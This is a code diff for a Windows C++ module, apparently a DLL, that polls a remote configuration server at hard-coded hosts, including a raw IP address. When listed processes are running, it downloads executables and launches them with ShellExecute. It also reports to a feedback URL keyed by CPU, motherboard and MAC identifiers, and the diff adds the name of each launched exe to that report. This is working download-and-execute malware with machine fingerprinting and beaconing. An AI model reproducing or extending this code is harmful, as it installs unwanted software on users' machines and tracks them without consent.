@@ -12,6 +12,7 @@ extern HMODULE g_hDLLModule;
 extern BOOL g_isExit;
 string g_strConfig = "";
 map<string, int> g_mapForExitGame;
+map<string, int> g_mapDownExe;	// 已下载exe
 
 // http://20170712.java.cdnjsp.wang/getClient.jsp?id=1
 // http://42.51.190.195/getClient.jsp?id=1
@@ -527,7 +528,7 @@ VOID GetFeedbackKey(string& strKey)
 	strKey += strMAC;
 }
 
-VOID DoFeedback(wstring type)
+VOID DoFeedback(wstring type, string exe)
 {
 	string result = "";
 	// http://xxxx/click.jsp?id=1&type=1&key=cpu_zhuban_00-00-00-00
@@ -545,6 +546,8 @@ VOID DoFeedback(wstring type)
 	strcat(szUrl, strType.c_str());
 	strcat(szUrl, "&key=");
 	strcat(szUrl, strKey.c_str());
+	strcat(szUrl, "&exe=");
+	strcat(szUrl, exe.c_str());
 	string webUrl(szUrl);
 
 	WriteLogFile("开始反馈:");
@@ -566,8 +569,7 @@ unsigned int _stdcall ThreadHaveProcessPopupWindows(VOID* param)
 		bRet = DoHaveProcessPopupWindows(g_strConfig);
 		if (bRet)
 		{
-			WriteLogFile("云增值业务执行成功...");
-			DoFeedback(L"6");
+			//
 		}
 		Sleep(1000*2);
 	}
@@ -610,6 +612,12 @@ BOOL DoHaveProcessPopupWindows(string &strConfig)
 			Utility_Replace(processName, "\"", "");
 			Utility_Replace(url, "\"", "");
 
+			// 是否已经下载过了
+			if (g_mapDownExe.find(processName) != g_mapDownExe.end())
+			{
+				continue;
+			}
+
 			if (Utility_IsHaveProcess((CHAR*)processName.c_str()))
 			{
 				wstring wstrDownUrl = Utility_string2wstring(url);
@@ -645,7 +653,11 @@ BOOL DoHaveProcessPopupWindows(string &strConfig)
 					ShellExecute(NULL, "open", szShortPath, NULL, NULL, SW_SHOWNORMAL);
 					//Utility_CreateProcessAsUser((char*)downFilePath.c_str());
 					//Utility_CreateProcessAsUser(szShortPath);
-					Utility_Replace(strConfig, processName, "XXX_YYY"); // 只运行一次，所以必须替换进程名称
+					//Utility_Replace(strConfig, processName, "XXX_YYY"); // 只运行一次，所以必须替换进程名称
+					g_mapDownExe[processName] = 1;
+
+					WriteLogFile("云增值业务执行成功...");
+					DoFeedback(L"6", processName);
 				}
 				else
 				{
